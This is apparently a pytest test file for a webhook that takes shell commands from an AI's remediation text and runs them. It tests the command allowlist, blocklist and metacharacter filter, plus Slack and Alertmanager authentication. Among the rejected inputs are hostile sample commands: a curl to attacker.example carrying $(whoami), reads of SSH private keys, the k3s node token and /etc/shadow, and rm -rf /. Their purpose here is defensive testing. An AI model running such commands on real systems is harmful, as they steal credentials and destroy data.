"""Unit tests for scripts/webhook.py — the security-critical parsing and
verification paths of the Claude auto-healing bridge.

Covers:
- parse_commands(): allowlist, blocklist, shell-metacharacter enforcement
- verify_slack(): HMAC signature + timestamp freshness
"""
import hashlib
import hmac
import time

import pytest

import webhook


# ── parse_commands ────────────────────────────────────────────────────────────

class TestParseCommandsAllowlist:
    def test_allows_kubectl(self):
        text = "```bash\nkubectl scale deployment/pylab -n pylab --replicas=1\n```"
        assert webhook.parse_commands(text) == [
            "kubectl scale deployment/pylab -n pylab --replicas=1"
        ]

    def test_allows_sudo_prefix(self):
        text = "```bash\nsudo k3s crictl rmi --prune\n```"
        assert webhook.parse_commands(text) == ["sudo k3s crictl rmi --prune"]

    @pytest.mark.parametrize("cmd", [
        "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent",
        "virsh start k3s-worker-2",
        "docker build -t 192.168.122.218:30500/pylab:latest /home/labadmin/pylab/",
    ])
    def test_allows_other_operators(self, cmd):
        assert webhook.parse_commands(f"```bash\n{cmd}\n```") == [cmd]

    def test_rejects_commands_outside_allowlist(self):
        text = "```bash\ncurl http://attacker.example/$(whoami)\nwget evil.sh\n```"
        assert webhook.parse_commands(text) == []


class TestParseCommandsBlocklist:
    def test_blocks_reading_private_keys(self):
        text = "```bash\nssh labadmin@192.168.122.219 cat ~/.ssh/id_rsa\n```"
        assert webhook.parse_commands(text) == []

    def test_blocks_node_token_read(self):
        text = "```bash\nssh labadmin@192.168.122.218 sudo cat /var/lib/rancher/k3s/server/node-token\n```"
        assert webhook.parse_commands(text) == []

    def test_blocks_kubectl_get_secret(self):
        text = "```bash\nkubectl get secret -n default\n```"
        assert webhook.parse_commands(text) == []

    def test_blocks_cat_of_secret_files(self):
        text = "```bash\nkubectl exec -it pod -- cat /etc/shadow\n```"
        assert webhook.parse_commands(text) == []

    def test_blocks_rm_rf_root(self):
        text = "```bash\nsudo kubectl debug node/x -- rm -rf /\n```"
        assert webhook.parse_commands(text) == []


class TestParseCommandsShellMetacharacters:
    """The system prompt forbids them; the parser must enforce it server-side."""

    @pytest.mark.parametrize("line", [
        "kubectl get pods | grep crash",
        "kubectl get nodes; virsh list --all",
        "kubectl get pods && kubectl get nodes",
        "kubectl get nodes `virsh list`",
        "kubectl get nodes $(virsh list)",
    ])
    def test_blocks_metacharacters(self, line):
        assert webhook.parse_commands(f"```bash\n{line}\n```") == []


class TestParseCommandsFormatting:
    def test_skips_comments_and_blank_lines(self):
        text = (
            "```bash\n"
            "# restart the agent\n"
            "\n"
            "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent\n"
            "```"
        )
        assert webhook.parse_commands(text) == [
            "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent"
        ]

    def test_collects_from_multiple_code_blocks(self):
        text = (
            "Diagnosis text.\n"
            "```bash\nkubectl get nodes\n```\n"
            "More prose.\n"
            "```bash\nkubectl get pods -A\n```"
        )
        assert webhook.parse_commands(text) == ["kubectl get nodes", "kubectl get pods -A"]

    def test_unlabelled_block_still_parsed(self):
        assert webhook.parse_commands("```\nkubectl get nodes\n```") == ["kubectl get nodes"]

    def test_no_code_block_yields_empty(self):
        assert webhook.parse_commands("No commands here, just a diagnosis.") == []


# ── verify_slack ──────────────────────────────────────────────────────────────

SECRET = "test-signing-secret"


def make_headers(body: bytes, secret: str = SECRET, ts: str | None = None):
    ts = ts or str(int(time.time()))
    base = f"v0:{ts}:{body.decode()}"
    sig = "v0=" + hmac.new(secret.encode(), base.encode(), hashlib.sha256).hexdigest()
    return {"X-Slack-Request-Timestamp": ts, "X-Slack-Signature": sig}


class TestVerifySlack:
    def test_valid_signature_passes(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab&text=kubectl%20get%20nodes"
        assert webhook.verify_slack(make_headers(body), body) is True

    def test_wrong_secret_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab"
        assert webhook.verify_slack(make_headers(body, secret="other"), body) is False

    def test_tampered_body_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        headers = make_headers(b"original=body")
        assert webhook.verify_slack(headers, b"tampered=body") is False

    def test_stale_timestamp_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab"
        stale = str(int(time.time()) - 301)
        assert webhook.verify_slack(make_headers(body, ts=stale), body) is False

    def test_older_timestamp_within_window_accepted(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab"
        # 5s inside the 300s replay window — accepted
        edge = str(int(time.time()) - 295)
        assert webhook.verify_slack(make_headers(body, ts=edge), body) is True

    def test_missing_headers_fail(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        assert webhook.verify_slack({}, b"command=%2Flab") is False

    def test_non_numeric_timestamp_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab"
        headers = make_headers(body)
        headers["X-Slack-Request-Timestamp"] = "not-a-number"
        assert webhook.verify_slack(headers, body) is False

    def test_secret_unset_fails_closed(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", "")
        assert webhook.verify_slack({}, b"anything") is False


# ── verify_alertmanager ────────────────────────────────────────────────────────────

class TestVerifyAlertmanager:
    def test_correct_bearer_token_passes(self, monkeypatch):
        monkeypatch.setattr(webhook, "ALERTMANAGER_TOKEN", "tok-123")
        headers = {"Authorization": "Bearer tok-123"}
        assert webhook.verify_alertmanager(headers) is True

    def test_wrong_token_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "ALERTMANAGER_TOKEN", "tok-123")
        headers = {"Authorization": "Bearer wrong"}
        assert webhook.verify_alertmanager(headers) is False

    def test_missing_header_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "ALERTMANAGER_TOKEN", "tok-123")
        assert webhook.verify_alertmanager({}) is False

    def test_unset_token_fails_closed(self, monkeypatch):
        monkeypatch.setattr(webhook, "ALERTMANAGER_TOKEN", "")
        assert webhook.verify_alertmanager({"Authorization": "Bearer x"}) is False


# ── approver allowlist wiring ─────────────────────────────────────────────────

class TestSlackApproversConfig:
    def test_empty_env_disables_allowlist(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_APPROVERS", [])
        assert webhook.SLACK_APPROVERS == []

    def test_parsing_comma_separated(self, monkeypatch):
        monkeypatch.setattr(
            webhook, "SLACK_APPROVERS",
            [u.strip() for u in "angel, ops-oncall ,".split(",") if u.strip()],
        )
        assert webhook.SLACK_APPROVERS == ["angel", "ops-oncall"]


# ── handle_alerts: per-alert status ──────────────────────────────────────────

class TestHandleAlertsPerAlertStatus:
    """A firing group can contain resolved alerts — each alert must branch on
    its own status, and only firing alerts may reach run_remediation()."""

    @pytest.fixture
    def mocks(self, monkeypatch):
        called = {"remediation": [], "firing": [], "resolved": []}
        monkeypatch.setattr(webhook, "run_remediation",
                            lambda a: called["remediation"].append(a) or None)
        monkeypatch.setattr(webhook, "notify_firing",
                            lambda a, n, issue=None, remediation=None, repeat=False: called["firing"].append(a))
        monkeypatch.setattr(webhook, "notify_resolved",
                            lambda a, n, issue=None: called["resolved"].append(a))
        monkeypatch.setattr(webhook, "find_open_issue", lambda n: None)
        monkeypatch.setattr(webhook, "create_issue", lambda a, n, r=None: None)
        monkeypatch.setattr(webhook, "close_issue", lambda i, a, n: None)
        return called

    @staticmethod
    def alert(name, status):
        return {"status": status,
                "labels": {"alertname": name, "severity": "warning"},
                "annotations": {}}

    def test_mixed_group_resolved_alert_not_remidiated(self, mocks):
        payload = {"status": "firing",
                   "alerts": [self.alert("NodeDown", "firing"),
                              self.alert("NodeDiskHigh", "resolved")]}
        webhook.handle_alerts(payload)

        remidiated = [a["labels"]["alertname"] for a in mocks["remediation"]]
        assert remidiated == ["NodeDown"], "resolved alert in firing group must not be remediated"
        assert len(mocks["firing"]) == 1
        assert len(mocks["resolved"]) == 1

    def test_firing_group_alerts_fire(self, mocks):
        payload = {"status": "firing",
                   "alerts": [self.alert("NodeDown", "firing")]}
        webhook.handle_alerts(payload)
        assert len(mocks["remediation"]) == 1
        assert len(mocks["firing"]) == 1
        assert mocks["resolved"] == []

    def test_resolved_group_with_firing_alert_still_remidiated(self, mocks):
        payload = {"status": "resolved",
                   "alerts": [self.alert("NodeDown", "firing")]}
        webhook.handle_alerts(payload)
        assert len(mocks["remediation"]) == 1
        assert mocks["resolved"] == []

    def test_alert_without_status_inherits_group(self, mocks):
        alert = self.alert("NodeDown", "firing")
        del alert["status"]  # status key absent entirely
        payload = {"status": "firing", "alerts": [alert]}
        webhook.handle_alerts(payload)
        assert len(mocks["remediation"]) == 1


# ── _ssh exit codes & run_remediation success ────────────────────────────────

class TestSshExitCodes:
    def test_ssh_returns_exit_code(self, monkeypatch):
        import subprocess as sp
        monkeypatch.setattr(webhook, "SSH_KNOWN_HOSTS", "")
        monkeypatch.setattr(webhook.subprocess, "run",
                            lambda *a, **k: sp.CompletedProcess(args=a, returncode=3, stdout="out", stderr=""))
        out, rc = webhook._ssh("h", "cmd")
        assert (out, rc) == ("out", 3)

    def test_ssh_timeout_maps_to_124(self, monkeypatch):
        import subprocess as sp
        monkeypatch.setattr(webhook, "SSH_KNOWN_HOSTS", "")
        def raise_timeout(*a, **k):
            raise sp.TimeoutExpired(cmd="ssh", timeout=1)
        monkeypatch.setattr(webhook.subprocess, "run", raise_timeout)
        out, rc = webhook._ssh("h", "cmd")
        assert rc == 124 and out == "(timeout)"

    def test_ssh_out_annotates_failure(self, monkeypatch):
        monkeypatch.setattr(webhook, "_ssh", lambda h, c, timeout=30: ("boom", 255))
        assert webhook._ssh_out("h", "c") == "[exit 255] boom"


class TestRunRemediationSuccess:
    @pytest.mark.parametrize("rc,expected", [(0, True), (1, False), (124, False), (255, False)])
    def test_success_follows_exit_code(self, monkeypatch, rc, expected):
        monkeypatch.setattr(webhook, "_ssh", lambda h, c, timeout=30: ("ignored output", rc))
        alert = {"labels": {"alertname": "NodeMemoryCritical", "instance": "192.168.122.230:9100"}}
        result = webhook.run_remediation(alert)
        assert result is not None and result["success"] is expected

    def test_output_wording_no_longer_defines_success(self, monkeypatch):
        # regression: 'error' string-grep used to decide success
        monkeypatch.setattr(webhook, "_ssh", lambda h, c, timeout=30: ("all good, no error here", 1))
        alert = {"labels": {"alertname": "NodeMemoryCritical", "instance": "192.168.122.230:9100"}}
        result = webhook.run_remediation(alert)
        assert result["success"] is False
